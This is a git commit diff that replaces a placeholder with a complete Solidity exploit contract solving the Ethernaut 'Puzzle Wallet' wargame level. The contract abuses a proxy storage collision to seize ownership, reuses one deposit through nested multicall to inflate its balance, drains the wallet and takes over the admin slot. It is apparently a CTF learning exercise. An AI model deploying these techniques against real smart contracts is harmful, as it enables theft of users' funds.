2c2562385781c5efcd1bbedbd9ce5be3572eac07
465326302 <465326302@qq.com>
2023-03-06 23:51:12 +0800

    结束

--- Ethernaut/Puzzle Wallet attack.sol
+++ Ethernaut/Puzzle Wallet attack.sol
@@ -1,17 +1,38 @@
-pragma solidity ^0.8.0;
+pragma solidity ^0.8;
 
-contract Attack {
-    address payable public wallet;
+interface IWallet {
+    function admin() external view returns (address);
+    function proposeNewAdmin(address _newAdmin) external;
+    function addToWhitelist(address addr) external;
+    function deposit() external payable;
+    function multicall(bytes[] calldata data) external payable;
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+    function setMaxBalance(uint256 _maxBalance) external;
+}
 
-    constructor(address payable _wallet) {
-        wallet = _wallet;
+contract Hack {
+    constructor(IWallet wallet) payable {
+        // overwrite wallet owner
+        wallet.proposeNewAdmin(address(this));
+        wallet.addToWhitelist(address(this));
+
+        bytes[] memory deposit_data = new bytes[](1);
+        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);
+
+        bytes[] memory data = new bytes[](2);
+        // deposit
+        data[0] = deposit_data[0];
+        // multicall -> deposit
+        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
+        wallet.multicall{value: 0.001 ether}(data);
+
+        // withdraw
+        wallet.execute(msg.sender, 0.002 ether, "");
+
+        // set admin
+        wallet.setMaxBalance(uint256(uint160(msg.sender)));
+
+        require(wallet.admin() == msg.sender, "hack failed");
+        selfdestruct(payable(msg.sender));
     }
-
-    function attack() public {
-        wallet.call{value: address(this).balance}("");
-    }
-    
-    // fallback function to receive ether
-    receive() external payable {}
-    
 }
